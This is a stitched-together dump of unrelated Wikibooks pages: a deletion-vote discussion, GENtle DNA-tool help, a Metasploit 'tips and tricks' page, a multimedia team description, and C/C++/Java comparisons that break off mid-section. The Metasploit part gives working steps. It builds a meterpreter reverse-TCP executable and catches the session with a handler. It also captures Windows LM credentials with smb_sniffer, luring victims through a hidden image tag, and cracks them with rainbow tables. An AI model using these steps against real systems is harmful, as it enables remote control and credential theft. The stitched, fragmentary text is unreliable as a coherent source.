* Ive attempted to start a rewrite of this thing, I think it's a lot better than it was, still could use a lot of work but I'm not really sure what the scope of the page is supposed to be... but if it's not enough that's fine by me. I'll stay neutral on this one for now. [[User:Mattb112885|Mattb112885]] &lt;small&gt;([[User talk:Mattb112885|talk]]) &lt;/small&gt; 01:25, 18 March 2007 (UTC)

* Including the nomination there appeared to be 5 votes for deletion and only 4 against yet it's been closed as 'keep'.  I do agree though that recent changes have improved the article so I'll keep quite for now. [[User:Xania|Xania]] [[Image:Flag_of_Poland_2.svg|15px]][[User talk:Xania|&lt;sup&gt;talk&lt;/sup&gt;]] 12:03, 18 March 2007 (UTC)
* Answered on your talk page but it is not about numerical votes AND the article has been edited constructively in the time in VfD --[[User:Herbythyme|&lt;font color=&quot;green&quot;&gt;Herby&lt;/font&gt;]] &lt;b&gt;&lt;sup&gt;&lt;small&gt;&lt;span style=&quot;color:#90F&quot;&gt;[[User talk:Herbythyme|talk thyme]]&lt;/span&gt;&lt;/small&gt;&lt;/sup&gt;&lt;/b&gt; 12:24, 18 March 2007 (UTC)

:&quot;Community Concensus&quot; requires more then 5 votes out of 9. Concensus favors the status quo, so the burden is on those who vote to delete to make that case that this page should be deleted. Apparently, we did not make that case convincingly, and so the page stays. To get a page deleted, we should expect an overwhelming majority of people to agree on it, or for the page to be such a blatant violation of policy that it qualifies as a speedy. I wanted the page to be deleted, but I agree that there was no concensus for that action. --[[User:Whiteknight|Whiteknight]] &lt;small&gt;([[User talk:Whiteknight|talk]]) ([[User:Whiteknight/Proposed Books|projects]])&lt;/small&gt; 22:25, 18 March 2007 (UTC)

::Can you point me to where that definition is written and approved ? Or the rational you are using for thing like &quot;overwhelming majority&quot;. txs.
::Nevertheless and not that is considered important, I agree with your final interpretation of the wish of the community. (this is no attempt to bait you into any further discussion on the subject just another request for clarification and validation to see if I finally understand something that still escapes me)
::From [[Wikibooks:Deletion_policy]] (active), &quot;After one week, if the voters have mostly reached a consensus about what to do, the appropriate action will be taken by an administrator. If not the voting may continue until a consensus is reached.&quot;, the keyword to validate your assessment is the word &quot;mostly&quot; but no clear ratio is defined or can invoked.
::Mostly may be 51%, but I think it deals with no active block to the decission. (one may be against but not willing to block it)  --[[User:Panic2k4|Panic]] 23:30, 18 March 2007 (UTC)
::I take also the chance to point out that the word &quot;mostly&quot; isn't at this time included on the [[Wikibooks:Deletion policy/Unstable]] version of the policy. --[[User:Panic2k4|Panic]] 23:58, 18 March 2007 (UTC)

:::[[WB:DP]] states that in VfD, &quot;...reaching consensus should occur according to [[Wikibooks:Decision making|the decision-making policy]]&quot; (it should likely be changed to say &quot;guideline&quot; instead of &quot;policy&quot;). Going to the decision making page, we see:
::::''Ultimately the state of &quot;community consensus&quot; involves the '''vast majority of users''' agreeing on some decision.''
:::The decision making page also says:
::::''Wikibooks is not a democracy, and a simple voter majority is not the default, nor the recommended method of deciding any discussion.''
:::This second quote shows that a 51% voter majority does not win a discussion. Even a discussion with a 75% majority after a straw poll should not be called in favor of the majority, unless perhaps there were only 4 people voting, and the dissenting vote isn't particularly strong. --[[User:Whiteknight|Whiteknight]] &lt;small&gt;([[User talk:Whiteknight|talk]]) ([[User:Whiteknight/Proposed Books|projects]])&lt;/small&gt; 01:00, 19 March 2007 (UTC)

::::Agree, these seems to be very contradictory and it lets much left to interpretation, but at least some factors must be considered it is indeed a guideline as such not enforcible (it expresses an intention or interpretation and was not fit by the involved on the voting to be made a policy, taking in attention that the voters are a minority actively expressing what they perceive to be the will of the community), it should indeed be taken in consideration but can't validate any decission (I have also taken in consideration the archived discussions and the still standing posts that target this particular problem). So, taking all that was written the single and common ground must be the general definition of consensus and that doesn't support any vote by majority, (laking a local redefinition of the term) that seems not to be the intention of the users discussing it. (even some expressing direct opposition to it)
::::The standing VfD policy goes even further and expressly states the normal interpretation of consensus (and it is a policy).
::::So in this my point is reinforced barring any historical facts, what was the default ? how it was previously or in the beginning ? how is it on another Wikimedia projects ?
::::I even see it as dangerous (to the evolution and representation of the community), the the wording used from &quot;Wikibooks is not a democracy, and a simple voter majority is not the default, nor the recommended method of deciding any discussion.&quot; (that I interpret as don't give voice to a user blocking a decission in bad faith) to ''vast majority'' (75% my interpretation) to &quot;overwhelming majority&quot; (85% my interpretation) to &quot;Mostly&quot; (51% my interpretation), taking in consideration our previous talks/events about this subject numbers of voters don't get any consistent application to the decisions and aren't particularly mentioned on the texts. Since you have [[http://en.wikibooks.org/w/index.php?title=User_talk%3AWhiteknight&amp;diff=788134&amp;oldid=788104 stated previously]] some point that give enforcible value to a guideline (against a policy that states the contrary) or make 3 users  ultimately responsible for the decission of what constitute abuse of the process of decission I think this is a question of major importance since we don't have a policy on the subject at the moment.
::::(I request that anyone that can provide answers to my questions to post them on my talk page)
::::Ok I think we shouldn't continue to debate it until more facts are presented, hope you agree with the assessment that a guideline can't be used to base the decission process. (that would be a different subject)  --[[User:Panic2k4|Panic]] 01:53, 19 March 2007 (UTC)

:Sorry we weren't directly discussing VfD (actually we are but on that module talkpage), it was only a request for information fallowed by some commenting and sharing information about the statement made about consensus and voting in general with direct implications on the VfD, I could have made my comment on the user talk page but this would prevent others to fallow the discussion that is of general importance. Anyway improved articles are always a good thing...  --[[User:Panic2k4|Panic]] 08:20, 19 March 2007 (UTC)
:Herby, your closure of this VfD was made in good faith, and neccessitated a judgement call from somebody &quot;in authority&quot; and having a neutral bias to this.  I think you fit the bill here, and it is unfortunate that your judgement was questioned.  I do think that this discussion has run its course, although it should be noted that the decision did have a very split opinion on the topic.  In this case we should try to follow [[WB:DP]] that says '''&quot;When in doubt, don't delete.&quot;'''
:This module certainly can (together with the whole book) be renominated again, and with a split decision like this you can't bring up a strong case like &quot;it survived a VfD... therefore keep&quot;.  Since I've already voiced my strong opinions on this module, I will not remove it from here, but I hope that others like Herby aren't discouraged from closing VfDs like this... and making a decision which goes against the raw vote count.  --[[User:Robert Horning|Rob Horning]] 18:43, 19 March 2007 (UTC)
::I don't think anybody really questioned the motivation to keep the module, I think that there are some people who simply don't understand the method of consensus-driven decision making.

:::Yup I clearly stated on my first post that I agreed with the decission, I just can not let pass incorrect information on the decission process anymore, 100% agreement == unanimity, anything that gets any opposing vote is not consensus (like 51%), it is called a vote by majority.

While many Wikibookians don't necessarily agree this book should even be on this project, this page in particular goes way over the top.  The user who created this page made only these edits.  I'm not deleting this myself only to get the opinion of another admin to confirm this really should be deleted, and give perhaps a final hope that this page could be transformed somehow with this threat of deletion.  This is not to delete the whole wikibook, just this page.  &lt;small&gt;—The preceding unsigned comment was added by [[User:88.191.51.214|88.191.51.214]] ([[User talk:88.191.51.214|talk]] • [[Special:Contributions/88.191.51.214|contribs]]) 03:06, 17 Mar 2007  (UTC{{{3|}}})&lt;/small&gt;&lt;!-- Template:Unsigned2 --&gt; (Tho this was a copy of what Rob Horning wrote originally - see comment)
*'''Comment''' - interesting, I had planned to bring this to VfD today but an IP appears to have beaten me to is.  Rob Horning placed a speedy tag on it about three weeks ago (with the comment used by the IP above) and I have no idea how many admins have looked at it but it remained undeleted.  I felt it should come here to &lt;s&gt;generate some heat&lt;/s&gt; sorry - reach a consensus.  It does seem like rubbish but that has never stopped us keeping stuff in the past --[[User:Herbythyme|&lt;font color=&quot;green&quot;&gt;Herby&lt;/font&gt;]] &lt;b&gt;&lt;sup&gt;&lt;small&gt;&lt;span style=&quot;color:#90F&quot;&gt;[[User talk:Herbythyme|talk thyme]]&lt;/span&gt;&lt;/small&gt;&lt;/sup&gt;&lt;/b&gt; 08:03, 17 March 2007 (UTC)
*'''Very Strong Delete''' - This page seems it is very much from a very awfully written Ian Flemming-like fan fiction.  I was very tempted to simply kill the page out right, but I felt it deserved at least a second opinion, which is why I tagged it for deletion instead at least to let another admin get a few laughs before it was gone.  As I pointed out, I do not want to turn this into yet another VfD discussion about this book (it has survived two such discussions already), but this page certainly seems to be out of tone with even the rest of this book, and was added by an individual who certainly did not take the rest of this Wikibook seriously.  As something to move to a &quot;deleted nonsense and other humor&quot;, it deserves a good chuckle.  But it certainly doesn't belong on Wikibooks in the main content namespace.  --[[User:Robert Horning|Rob Horning]] 15:16, 17 March 2007 (UTC)
**&quot;Very awfully written&quot;? :-( --[[User:Johnny Castaway|Johnny Castaway]] 18:53, 17 March 2007 (UTC)
**:No, I would not consider this to be brilliant prose or anything worthy of emulation in terms of a writing sample.  Funny though.  Perhaps transwiki this to uncyclopedia instead?  It would be something fun to add to &quot;Unbooks&quot; like &quot;Unnews&quot;. --[[User:Robert Horning|Rob Horning]] 19:05, 17 March 2007 (UTC)

*'''Move'''to uncyclopedia, it's a laugh, but not Wikibook stuff.--[[User:Archolman|Dick]] 23:44, 17 March 2007 (UTC)
*'''Delete''' unless all contributors agree to re-license their contributions into Cc-by-nc-sa-2.0 ... how one would go about contact the two anonymous contributors is beyond me. --[[User:Iamunknown|Iamunknown]] 01:10, 18 March 2007 (UTC)
* '''Move''' ... Perhaps it (at least the useful parts) should be merged with a book about the theoretical prospects of terra-forming or construction engineering. Additionally, most of the humor should be squeezed out and any content possible should be made into an educational quality text. --[[User:Remi0o|Remi]] 03:36, 19 March 2007 (UTC)
* '''Delete''' The [[Making an Island]] book has been nominated for VfD a number of times, and I believe that the only reason why it is kept is because it is an instructional resource on the topics of terraforming and social engineering which are properly discussed in terms of a large project such as this. Pages such as this one turn the book from being a creative way to discuss and interesting topic into a completely rediculous waste of space. This book already pushes the boundary in terms of our inclusion criteria, and if this page stays, then the whole book likely will need to be reconsidered for deletion. --[[User:Whiteknight|Whiteknight]] &lt;small&gt;([[User talk:Whiteknight|talk]]) ([[User:Whiteknight/Proposed Books|projects]])&lt;/small&gt; 15:23, 19 March 2007 (UTC)

'''Dot plot'''s can be generated in GENtle between two DNA sequences, which can be selected from drop-down lists in the toolbar. The calculation of the dot plot will start immediately and take a few seconds, depending on the length of the sequences.

A window size and a mismatch limit can be chosen as pararmeters for the dot plot. A click into the plot will take you to the respective position in sequence 1 (the first dropdown box), unless &quot;Open sequence 2&quot; is selected.

Either sequence can be opened via the context menu at the respective position. Also, the plot image can be copied or saved via the context menu.</text>

[[image:GENtle_restriction_identifier.png|thumb|Restriction Identifier.]]
The '''Restriction Identifier''' can be used to choose a restriction enzyme that can be used to differentiate two or more DNA sequences in an agarose gel. Its display is based on the [[../Virtual Gel|virtual gel]].

In the left column, all opened DNA sequences are shown in the lower box, and can be checked to be used in the identification, which will start once two or more DNA sequences are selected.

The generated enzyme list (upper box) can be affected by choosing an enzyme group, and by setting limitations, which determine that two bands in different lanes, in order to be recognized as &quot;different&quot;, have to differ at least a given number of base pairs or a percentage of their length.

Upon selecting one of the resulting enzymes, the appropriate simulated gel will appear for visual inspection.</text>

'''Tips and Tricks for the Metasploit Framework'''

----

== Abstract ==

Whether writing exploits or using the Metasploit Framework, there are numerous tricks available to the end user. 

== Writing Exploits ==

* Unsure about what characters may be filtered? Use the '''Rex::text.charset_exclude( badchars )''' function:

 shellcode = Rex::text.charset_exclude( payload_badchars )
 buf[scloc] = shellcode
 buf[jmploc] = [ target['Rets'][0] ].pack('V')

Set your debugger to break at the jump location and review the characters in your dump. (Add screenshot)

* Evasion techniques are best applied after verification of exploitability.

* Some payloads may not work correctly in every exploit, try multiple payloads after you have execution flow.

== Using Exploit-less Handlers (Executable Payloads) ==

At some point during your use with Metasploit you'll come into the need to run a payload without an exploit. This is possible with the use of the multi/handler exploit module.

Step 1. Generate your payload executable:

 $ msfpayload windows/meterpreter/reverse_tcp LHOST=192.168.1.1 X &gt; met-reverse.exe

Step 2. Start your listener:
&lt;pre&gt;
msf &gt; use multi/handler
msf exploit(handler) &gt; set PAYLOAD windows/meterpreter/reverse_tcp
PAYLOAD =&gt; windows/meterpreter/reverse_tcp
msf exploit(handler) &gt; set LHOST 192.168.1.1
LHOST =&gt; 192.168.1.1
msf exploit(handler) &gt; exploit
[*] Started reverse handler
[*] Starting the payload handler...
&lt;/pre&gt;

Step 3. Run the executable and interact
&lt;pre&gt;
msf exploit(handler) &gt; exploit
[*] Started reverse handler
[*] Starting the payload handler...
[*] Transmitting intermediate stager for over-sized stage...(89 bytes)
[*] Sending stage (2834 bytes)
[*] Sleeping before handling stage...
[*] Uploading DLL (81931 bytes)...
[*] Upload completed.
[*] Meterpreter session 1 opened (192.168.1.1:4444 -&gt; 192.168.1.2:1060)
 
meterpreter &gt;
&lt;/pre&gt;

This document contains several syntax examples for creating and using stand alone payloads.  It also contains discussion about avoiding antivirus detection.   http://www.giac.org/certified_professionals/practicals/GCIH/01072.php


== LM Half-Challenge ==

Originally blogged [http://grutztopia.jingojango.net/2007/04/ntlmv1-metasploit-and-you.html here] - Using the [http://www.freerainbowtables.com/index-rainbowtables-tables-halflmchall.html Free Rainbow Tables HALFLMCHALL Tables] and a modified Metasploit 2.7 smb_sniffer exploit module, obtaining and cracking LANMAN Challenges has never been easier.

'''Step 1.''' Use Metasploit 2.7 (for now) and the updated [http://grutz.jingojango.net/exploits/smb_sniffer.pm smb_sniffer.pm] exploit module. This does not work on a Windows platform.

'''Step 2.''' Unpack Msf2.7 and place smb_sniffer.pm under the exploits/ directory, replacing the older version.

'''Step 3.''' Set up your Metasploit and run it as root

&lt;pre&gt;
framework-2.7 $ sudo ./msfconsole
Password:


                 o                       8         o   o
                 8                       8             8
ooYoYo. .oPYo.  o8P .oPYo. .oPYo. .oPYo. 8 .oPYo. o8  o8P
8' 8  8 8oooo8   8  .oooo8 Yb..   8    8 8 8    8  8   8
8  8  8 8.       8  8    8   'Yb. 8    8 8 8    8  8   8
8  8  8 `Yooo'   8  `YooP8 `YooP' 8YooP' 8 `YooP'  8   8
..:..:..:.....:::..::.....::.....:8.....:..:.....::..::..:
::::::::::::::::::::::::::::::::::8:::::::::::::::::::::::
::::::::::::::::::::::::::::::::::::::::::::::::::::::::::


+ -- --=[ msfconsole v2.7 [161 exploits - 76 payloads]

msf &gt; use smb_sniffer
msf smb_sniffer &gt; show options

Exploit Options
===============

  Exploit:    Name       Default         Description
  --------    -------    ------------    -----------------------------------------------
  optional    KEY        �&quot;3DUfw�        The Challenge key
  optional    PWFILE                     The PWdump format log file (optional)
  optional    LOGFILE    smbsniff.log    The path for the optional log file
  required    LHOST      0.0.0.0         The IP address to bind the SMB service to
  optional    UID        0               The user ID to switch to after opening the port
  required    LPORT      139             The SMB server port

  Target: Targetless Exploit

msf smb_sniffer &gt; set PWFILE=/tmp/pwtest.txt
PWFILE=/tmp/pwtest.txt:
msf smb_sniffer &gt; exploit
[*] Listener created, switching to userid 0
[*] Starting SMB Password Service
&lt;/pre&gt;

'''Step 4.''' Have somebody connect to your server. It can be as simple as a &quot;dir \\serverip\share&quot; or &quot;&lt;img src=\\serverip\share\file.gif height=0 width=0&gt;&quot; tag on some HTML page. Windows will attempt to make the connection and send the logged in user credentials to your waiting server.

[[Image:Metasploit-27-smbsniffer.png]]

'''Step 5.''' Take your new pwtest.txt file and copy it over to a Cain &amp; Able machine that has the HALFLMCHALL tables.

[[Image:Metasploit-27-smbsniff-pw.png]]

[[Image:Metasploit-27-cainadd.png]]

'''Step 6.''' Select the hash you want to crack, right click and select Cryptanalysis Attack-&gt;HALFLM Hashes + challenge-&gt;via RainbowTables, add the tables, and crack!

[[Image:Metasploit-27-cainsuccesshalflm.png]]

'''Caveats'''

* Only LANMAN hashes can be obtained this way. If the client denies LM then too bad.
* Only the first 7 characters are in the tables. You have to brute force the rest(or split the hash in 2 and add AAD3B435B51404EE at each end).
* The tables are 54 GB total. It will take some time to load and search.</text>

      <text xml:space="preserve">It is the main goal and objective of the Interactive Team to assemble the core of the project in Director once all media is captured and edited.  To put it basic terms, once the pieces are gathered, it is the job of the Interactive Team to assemble them and add the coding and effects needed to create the immersive multimedia experience.  Once this is created, the project will undergo a process of debugging followed by fixing those errors.  Once the final product is polished, it will be authored in a format that adheres to the medium of playback.

      <comment>/* Reasons to chose another language */</comment>
      <text xml:space="preserve">==== C 89/99 ====
[[Subject:C programming language|C]] was essentially the core language of C++ when Bjarne Stroustrup decided to create a &quot;better C&quot;. Many of the syntax conventions and rules still hold true, so we can even state that C was a subset of C++. Most recent C++ compilers can also compile C code, taking into consideration the small incompatibilities, since [[w:C99|C99]] and C++ 2003 are not compatible any more.  You can also check more information about the C language on the [[C Programming|C Programming Wikibook]].
 
{{NOTE|In practice, much C99 code will still compile with a C++ compiler, but the language is no longer a proper subset.  Compatibility is not guaranteed.}}

C++ as defined by the ANSI standard in 1998 (called C++98 at times) is very nearly, but not quite, a superset of the C language as it was defined by its first ANSI standard in 1989 (known as C89).  There are a number of ways in which C++ is not a strict superset, in the sense that not all valid C89 programs are valid C++ programs, but the process of converting C code to valid C++ code is fairly trivial (avoiding reserved words, getting around the stricter C++ type checking with casts, declaring every called function, and so on).

In 1999, C was revised and many new features were added to it. As of 2004, most of these new &quot;C99&quot; features are not in C++. Some (including Stroustrup himself) have argued that the changes brought about in C99 have a philosophy distinct from what C++98 adds to C89, and hence these C99 changes are directed towards increasing incompatibility between C and C++.

The merging of the languages seems a dead issue, as coordinated actions by the C and C++ standards committees leading to a practical result did not happen and it can be said that the languages started to diverge.
 
Some of the differences are:
* C++ supports function overloading, this is absent in C, especially in C89 (it can be argued, depending on how loosely function overloading is defined, that it is possible to some degree to emulate these capabilities using the [[w:C99|C99]] standard).
* C++ supports [[C++ Programming/Programming Languages/Paradigms/Inheritance|inheritance]] and [[C++ Programming/Programming Languages/Paradigms/Polymorphism|polymorphism]].
* C++ adds keyword '''class''', but keeps '''struct''' from C, with compatible semantics.
* C++ supports access control for class members.
* C++ supports generic programming through the use of [[C++ Programming/Templates|templates]].
* C++ extends the C89 standard library with its own standard library.
* C++ and C99 offer different complex number facilities.
* C++ has '''bool''' and '''wchar_t''' as primitive types, while in C they are typedefs.
* C++ comparison operators returns '''bool''', while C returns '''int'''.
* C++ supports overloading of operators.
* C++ character constants have type '''char''', while C character constants have type '''int'''.
* C++ has specific [[C++ Programming/Programming Languages/C++/Code/Statements/Variables/Type Casting|cast operators]] ({{C++ Programming/kw|static_cast}}, {{C++ Programming/kw|dynamic_cast}}, {{C++ Programming/kw|const_cast}} and {{C++ Programming/kw|reinterpret_cast}}).
* C++ adds '''mutable''' keyword to address the imperfect match between physical and logical constness.
* C++ extends the type system with ''references''.
* C++ supports '''member functions''', '''constructors''' and '''destructors''' for user-defined types to establish invariants and to manage resources.
* C++ supports [[C++ Programming/RTTI|runtime type identification]] (RTTI), via '''typeid''' and {{C++ Programming/kw|dynamic_cast}}.
* C++ includes [[C++ Programming/Exception Handling|exception handling]].
* C++ has &lt;tt&gt;std::vector&lt;/tt&gt; as part of its standard library instead of variable-length arrays as in C.
* C++ treats {{C++ Programming/kw|sizeof}} operator as compile time operation, while C allows it be a runtime operation.
* C++ has '''new''' and '''delete''' operators, while C uses '''malloc''' and '''free''' library functions.
* C++ supports object-oriented programming without extensions.
* C++ does not require use of macros, unlike C, that uses them for careful information-hiding and abstraction (especially important for C code portability).
* C++ supports per-line comments denoted by '''//'''.  (C99 started official support for this comment system, and most compilers support this as an extension.)
* C++ {{C++ Programming/kw|register}} keyword is semantically different to C's implementation.

===== Choosing C or C++ =====
It is not uncommon to find someone defending C over C++ (or vice versa) or complaining about some features of these languages. There is no scientific evidence to put a language above another in general terms; the only reason that does have some traction is the possibility of deep changes or unknown bugs in a language that is still very recent. In the case of C or C++ this is not the case, as both languages are very mature. Though both are still evolving, the new features keep a high level of compatibility with old code, making the use of those new constructs a programmer's decision. It is not uncommon to establish rules in a project to limit the use of parts of a language (such as RTTI, exceptions, or virtual-functions in inner loops), depending on the proficiency of the programmers or the needs of the project. It is also common for new hardware to support lower level languages first.  Due to C being less extensive and lower level than C++, it is easier to check and comply with strict industry guidelines and automate those steps. Another benefit of C is that it is easier for the programmer to do low level optimizations, though most C++ compilers can guarantee near perfect optimizations automatically, a human can still do more and C has less complex structures.
 
Any of the valid reasons to choose a language over another is mostly due to programmer's choice that indirectly deals with choosing the best tool for the job and having the resources needed to complete it. It would be hard to validate selecting C++ for a project if the available programmers only knew C. Even though in the reverse case it might be expected for a C++ programmer to produce functional C code, the mindset and experience needed are not the same. The same rationale is valid for C programmers and ASM. This is due to the close relations that exist in the language's structure and historic evolution.

One could argue that using the C subset of C++, in a C++ compiler, is the same as using C, but in reality we find that it will generate slightly different results depending on the compiler used.

      <comment>/* Java */ Intro copyedited, rephrased.</comment>
      <text xml:space="preserve">The [[Java Programming|Java programming language]] and C++ share many common traits. A comparison of the two languages follows here. For a more in-depth look at Java, see the [[Programming:Java|Java Programming WikiBook]].

==== Java ====
Java was initially created to support [[w:network computing|network computing]] on [[w:embedded system|embedded system]]s. Java was designed to be extremely [[w:porting|portable]], [[w:computer security|secure]], [[w:thread (computer science)|multi-threaded]] and [[w:distributed computing|distributed]], none of which were design goals for C++. Java has a syntax familiar to C programmers, but direct compatibility with C was not maintained. Java was also specifically designed to be simpler than C++, but continues to evolve above that simplification.

During the decade between 1999 and 2009, especially in the part of the programming industry dedicated to enterprise solutions, “Coffee-based” languages, which rely on &quot;virtual machines&quot; that are familiar in Smalltalk, grew in prominence. This was a trade between performance and productivity, something that made perfect sense at the time where computing power and the need of simplified and more streamlined language that permitted not only easy adoption but a lower learning curve. There is enough similitude between the languages that the proficient C++ programmers can easily adapt to Java, that is still today in ways less complex and even in comparison more consistent in the adopted paradigms than C++.

This shift in interest has however decreased, mostly due to the evolution of the languages. C++ and Java evolution has merged much of the gap about the problems and limitations of both languages, the software requirements today have also shifted and fragmented more. Now we have specific requirements for mobile, data-center and desktop computing this makes the programming language selection an even more central issue.

Differences between C++ and Java are:
* C++ parsing is somewhat more complicated than with Java; for example, &lt;code&gt;Foo&amp;lt;1&amp;gt;(3);&lt;/code&gt; is a sequence of comparisons if Foo is a variable, but it creates an object if Foo is the name of a class template.
* C++ allows {{C++ Programming/kw|namespace}} level constants, variables, and functions. All such Java declarations must be inside a class or [[w:interface (Java)|interface]].
* &lt;code&gt;[[w:const|const]]&lt;/code&gt; in C++ indicates data to be 'read-only,' and is applied to types. &lt;code&gt;final&lt;/code&gt; in Java indicates that the variable is not to be reassigned. For basic types such as &lt;code&gt;const int&lt;/code&gt; vs &lt;code&gt;final int&lt;/code&gt; these are identical, but for complex classes, they are different.
* C++ didn't support constructor delegation until the C++11 standard, and only very recent compilers support this.
* C++ generates machine code that runs on the hardware, Java generates bytecode that runs on a virtual machine so with C++ you have greater power at the cost of portability.
* C++, &lt;tt&gt;int main()&lt;/tt&gt; is a function by itself, without a class.
* C++ access specification ('''public''', '''private''') is done with labels and in groups.
* C++ access to class members default to &lt;tt&gt;private&lt;/tt&gt;, in Java it is package access.
* C++ classes declarations end in a semicolon.
* C++ lacks language level support for garbage collection while Java has built-in garbage collection to handle memory deallocation.
* C++ supports {{C++ Programming/kw|goto}} statements; Java does not, but its [[w:labelled break|labeled break]] and [[w:labelled continue|labeled continue]] statements provide some structured {{C++ Programming/kw|goto}}-like functionality. In fact, Java enforces [[w:structured control flow|structured control flow]], with the goal of code being easier to understand.
* C++ provides some low-level features that Java lacks. In C++, pointers can be used to manipulate specific memory locations, a task necessary for writing low-level [[w:operating system|operating system]] components. Similarly, many C++ compilers support [[w:inline assembler|inline assembler]]. In Java, assembly code can still be accessed as libraries, through the [[w:Java Native Interface|Java Native Interface]]. However, there is significant overhead for each call.
* C++ allows a range of implicit conversions between native types, and also allows the programmer to define implicit conversions involving compound types. However, Java only permits widening conversions between native types to be implicit; any other conversions require explicit cast syntax. C++11 disallows narrowing conversions from initializer lists.
** A consequence of this is that although loop conditions (&lt;code&gt;if&lt;/code&gt;, &lt;code&gt;while&lt;/code&gt; and the exit condition in {{C++ Programming/kw|for}}) in Java and C++ both expect a boolean expression, code such as &lt;code&gt;if(a = 5)&lt;/code&gt; will cause a compile error in Java because there is no implicit narrowing conversion from int to boolean. This is handy if the code were a typo for &lt;code&gt;if(a == 5)&lt;/code&gt;, but the need for an explicit cast can add verbosity when statements such as &lt;code&gt;if (x)&lt;/code&gt; are translated from Java to C++.
* For passing parameters to functions, C++ supports both true [[w:pass-by-reference|pass-by-reference]] and [[w:pass-by-value|pass-by-value]]. As in C, the programmer can simulate by-reference parameters with by-value parameters and [[w:indirection|indirection]]. In Java, all parameters are passed by value, but object (non-primitive) parameters are [[w:reference (computer science)|reference]] values, meaning [[w:indirection|indirection]] is built-in.
* Generally, Java built-in types are of a specified size and range; whereas C++ types have a variety of possible sizes, ranges and representations, which may even change between different versions of the same compiler, or be configurable via compiler switches.
** In particular, Java characters are 16-bit [[w:Unicode|Unicode]] characters, and strings are composed of a sequence of such characters. C++ offers both narrow and wide characters, but the actual size of each is platform dependent, as is the character set used. Strings can be formed from either type.
* The rounding and precision of floating point values and operations in C++ is platform dependent. Java provides a [[w:strictfp|strict floating-point model]] that guarantees consistent results across platforms, though normally a more lenient mode of operation is used to allow optimal floating-point performance.
* In C++, [[w:pointers|pointers]] can be manipulated directly as memory address values. Java does not have pointers&amp;mdash;it only has object references and array references, neither of which allow direct access to memory addresses. In C++ one can construct pointers to pointers, while Java references only access objects.
* In C++ pointers can point to functions or member functions ([[w:function pointer|function pointer]]s or [[w:functor|functor]]s). The equivalent mechanism in Java uses object or interface references. C++11 has library support for function objects.
* C++ features programmer-defined [[w:operator overloading|operator overloading]]. The only overloaded operators in Java are the &quot;&lt;code&gt;+&lt;/code&gt;&quot; and &quot;&lt;code&gt;+=&lt;/code&gt;&quot; operators, which concatenate strings as well as performing addition.
* Java features standard [[w:Application programming interface|API]] support for [[w:Reflection (computer science)|reflection]] and [[w:dynamic loading|dynamic loading]] of arbitrary new code.
* Java has generics. C++ has templates.
* Both Java and C++ distinguish between native types (these are also known as &quot;fundamental&quot; or &quot;built-in&quot; types) and user-defined types (these are also known as &quot;compound&quot; types). In Java, native types have value semantics only, and compound types have reference semantics only. In C++ all types  have value semantics, but a reference can be created to any object, which will allow the object to be manipulated via reference semantics.
* C++ supports [[w:multiple inheritance|multiple inheritance]] of arbitrary classes. Java supports multiple inheritance of types, but only single inheritance of implementation. In Java, a class can derive from only one class, but a class can implement multiple [[w:Interface (Java)|interface]]s.
* Java explicitly distinguishes between interfaces and classes. In C++ multiple inheritance and pure virtual functions makes it possible to define classes that function just as Java interfaces do.
* Java has both language and standard library support for [[w:multi-threading|multi-threading]]. The &lt;code&gt;synchronized&lt;/code&gt; [[w:Java keywords|keyword in Java]] provides simple and secure [[w:Mutual exclusion|mutex lock]]s to support multi-threaded applications. C++11 provides similar capabilities. While mutex lock mechanisms are available through libraries in previous versions of C++, the lack of language semantics makes writing [[w:thread safe|thread safe]] code more difficult and error prone.

===== Memory management ===== 
* Java requires automatic [[w:Garbage collection (computer science)|garbage collection]]. Memory management in C++ is usually done by hand, or through [[w:smart pointer|smart pointer]]s. The C++ standard permits garbage collection, but does not require it; garbage collection is rarely used in practice. When permitted to relocate objects, modern garbage collectors can improve overall application space and time efficiency over using explicit deallocation.
* C++ can allocate arbitrary blocks of memory. Java only allocates memory through object instantiation. (Note that in Java, the programmer can simulate allocation of arbitrary memory blocks by creating an array of bytes. Still, Java [[w:array|array]]s are objects.)
* Java and C++ use different idioms for resource management. Java relies mainly on garbage collection, while C++ relies mainly on the [[w:Resource Acquisition Is Initialization|RAII (Resource Acquisition Is Initialization)]] idiom. This is reflected in several differences between the two languages:
** In C++ it is common to allocate objects of compound types as local stack-bound variables that are destructed when they go '''''[[C++ Programming/Programming Languages/C++/Code/Statements/Scope|out of scope]]'''''. In Java compound types are always allocated on the heap and collected by the garbage collector (except in virtual machines that use [[w:escape analysis|escape analysis]] to convert heap allocations to stack allocations).
** C++ has destructors, while Java has [[w:finalizer|finalizer]]s. Both are invoked prior to an object's deallocation, but they differ significantly. A C++ object's destructor must be implicitly (in the case of stack-bound variables) or explicitly invoked to deallocate the object. The destructor executes [[w:Synchronization|synchronously]] at the point in the program at which the object is deallocated. Synchronous, coordinated uninitialization and deallocation in C++ thus satisfy the RAII idiom. In Java, object deallocation is implicitly handled by the garbage collector. A Java object's finalizer is invoked [[w:Asynchrony|asynchronously]] some time after it has been accessed for the last time and before it is actually deallocated, which may never happen. Very few objects require finalizers; a finalizer is only required by objects that must guarantee some clean up of the object state prior to deallocation&amp;mdash;typically releasing resources external to the JVM. In Java safe synchronous deallocation of resources is performed using the try/finally construct.
** In C++ it is possible to have a [[w:dangling pointer|dangling pointer]] &amp;ndash; a [[w:reference (computer science)|reference]] to an object that has been destructed; attempting to use a dangling pointer typically results in program failure. In Java, the garbage collector won't destruct a referenced object.
** In C++ it is possible to have an object that is allocated, but unreachable. An [[w:unreachable object|unreachable object]] is one that has no reachable references to it. An unreachable object cannot be destructed (deallocated), and results in a [[w:memory leak|memory leak]]. By contrast, in Java an object will not be deallocated by the garbage collector ''until'' it becomes unreachable (by the user program). (Note: ''[[w:weak reference|weak reference]]s'' are supported, that work with the Java garbage collector to allow for different ''strengths'' of reachability.) Garbage collection in Java prevents many memory leaks, but leaks are still possible under some circumstances.

===== Libraries ===== 
* [[C++ Programming/STL|C++ standard library]] provides a limited set of basic and relatively general purpose components. Java has a considerably larger standard library. This additional functionality is available for C++ by (often free) third party libraries, but third party libraries do not provide the same ubiquitous cross-platform functionality as standard libraries.
* C++ is mostly [[w:backward compatible|backward compatible]] with C, and C libraries (such as the [[w:Application programming interface|API]]s of most [[w:operating system|operating system]]s) are directly accessible from C++. In Java, the richer functionality of its standard library provides [[w:cross-platform|cross-platform]] access to many features typically only available in platform-specific libraries. Direct access from Java to native operating system and hardware functions requires the use of the [[w:Java Native Interface|Java Native Interface]].

===== Runtime ===== 
